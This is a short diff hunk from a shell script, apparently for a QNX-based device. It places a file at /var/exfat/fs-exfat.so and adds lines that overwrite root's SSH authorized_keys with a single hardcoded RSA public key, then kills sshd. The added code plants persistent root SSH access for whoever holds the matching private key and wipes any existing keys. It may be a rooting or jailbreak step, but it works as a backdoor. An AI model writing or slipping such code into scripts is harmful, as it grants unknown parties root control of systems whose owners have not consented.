@@ -15,6 +15,9 @@
     chmod 755 /var/exfat/fs-exfat.so
   fi
   mkdir -p /root/.ssh
+  cat > /root/.ssh/authorized_keys <<EOF2
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDOBpa9oTHJo8D4D8AESlyuR3HM9aFoFo087SV7Iq98MeM++aTaEj9Ik/vjBuV6ir+InVcPfwG+GkQ9pW2YaPzsBeKfUzBoSocW4MxcGlW8cQ8zEw1s2+acmRaDeNaBta5GTDS2iyi8+LY/SQtVLzkmeZR1+gWs3/UNVfOzr5t7NOL5WPhLj7qb3n2GZyiXe90czYNtEyeVmnnsyUmpSGtDHlJiR8V5625ASJXlbBymjMR/mFOwuIJRW3ZPqcEFJyQi4gMLF8FuGNysyd+IAK42hhCAcLzKjWh6hQ/WuZLLLUeJ3GUys4T03op3y/DBW89Y3S0xhtyeSu7nqGwVA13yRHzMgJEtfhoEGiTQg8kl1Z2cLLdlkcHuHNTWE5R7EQzhqIdUXdnb3BZVJ/vK8x3D7PWlsJg/Y/lrHY9PTNqIsOW4vdDZxaUKrj9EDGasirFaRI2j1kvmfIfjR9RWAHkVWKzVID0lUN8PelohforXY+UxxRXasVJt4fSIpd6Qnxr8GSB/IRzD65nPcyy0B2xFklvCf7KkJzAEWR7x6ZiQIK+2PhdO7bD7HfCJguTMRzSrPPr/BSZEio0iwVnGI+kw9xZYeo8sHZoDK9fDARoz/iymAq2hmnWb3yT/hYt+2PELGI0NrnONWo6JjykOA9s2N/RnrRREofv3Ni/tB0O9NQ==
+EOF2
   chmod 700 /root/.ssh
   chmod 600 /root/.ssh/authorized_keys
   slay -f sshd 2>/dev/null
